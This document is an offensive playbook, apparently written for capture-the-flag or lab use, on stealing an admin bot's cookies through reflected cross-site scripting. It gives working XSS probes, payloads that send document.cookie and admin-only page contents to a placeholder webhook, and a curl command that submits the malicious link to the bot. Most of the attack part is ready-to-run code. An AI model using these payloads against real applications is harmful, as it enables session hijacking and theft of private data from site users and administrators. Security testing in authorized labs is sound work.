# Admin Bot Cookie Exfil Via Reflected XSS

## Context

Use when an application:

- reflects user input into HTML
- provides a report/send-to-admin URL feature
- causes an admin/support bot to visit submitted same-origin links

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live secrets, tokens, cookies, flags, or private URLs in reusable files.

## Reflection Probe

```bash
curl -sS -G "https://[host]/" --data-urlencode "q=<img src=x onerror=alert(1)>"
```

Useful tags to test:

```html
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<script>alert(1)</script>
<details open ontoggle=alert(1)>
```

## Cookie Exfil Payload

```html
<script>fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))</script>
```

Event-handler variant:

```html
<img src=x onerror="fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))">
```

## Same-Origin XSS URL

```text
https://[host]/?q=<script>fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))</script>
```

Adjust parameter name to match the target (`q`, `search`, `msg`, etc.).

## Report To Admin Bot

```bash
curl -sS -X POST "https://[host]/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[host]/?q=<script>fetch('\''https://[webhook]?c='\''+encodeURIComponent(document.cookie))</script>"}'
```

Expected bot policy errors:

```text
The admin only visits this aviary.
admin only visits same origin
invalid url
```

## Fallback When Cookies Are HttpOnly

Fetch admin-only content from inside the bot browser:

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(t => fetch('https://[webhook]?d=' + encodeURIComponent(t)));
</script>
```

Try common admin paths only in authorized targets.

## Why This Works

The bot loads attacker-controlled HTML in a privileged browser context. If sensitive cookies lack `HttpOnly`, JavaScript can read and send them to an external webhook.

## Common Mistakes

- Reporting an external URL when the bot only accepts same-origin links.
- Using self-XSS without a realistic victim/bot path.
- Assuming alert proof equals reportable impact; bot labs usually need exfil or admin action.
- Forgetting to URL-encode the payload when embedding it in JSON or query strings.

## Escalation Order

1. Reflection probe
2. Same-origin script/event-handler execution
3. `document.cookie` exfil
4. Admin-only fetch exfil
5. CSP-specific bypasses only if execution is blocked
